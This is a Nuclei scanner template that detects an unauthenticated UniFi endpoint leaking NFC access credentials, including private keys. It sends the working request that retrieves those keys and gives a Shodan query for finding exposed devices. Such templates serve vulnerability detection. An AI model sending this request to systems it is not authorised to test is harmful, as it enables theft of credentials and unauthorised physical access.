id: unifi-nfc-credentials

info:
  name: UniFi - NFC Credentials
  author: DhiyaneshDk
  severity: high
  description: |
    An unauthenticated GET to /api/v1/user_assets/touch_pass/keys returns JSON containing live credential material (PEM private key, Apple NFC/express key values, terminal type, TTL, google_pass_auth_key block, version identifiers) over a publicly reachable port â€” allowing theft and immediate misuse of mobile/NFC access credentials.
  reference:
    - https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"UniFi Dream Machine SE"
  tags: unifi,unauth,vuln

http:
  - raw:
      - |
        @Host: {{Hostname}}:9780
        GET /api/v1/user_assets/touch_pass/keys HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"google_pass_auth_key")'
          - 'contains(content_type, "application/json")'
          - 'status_code == 200'
        condition: and
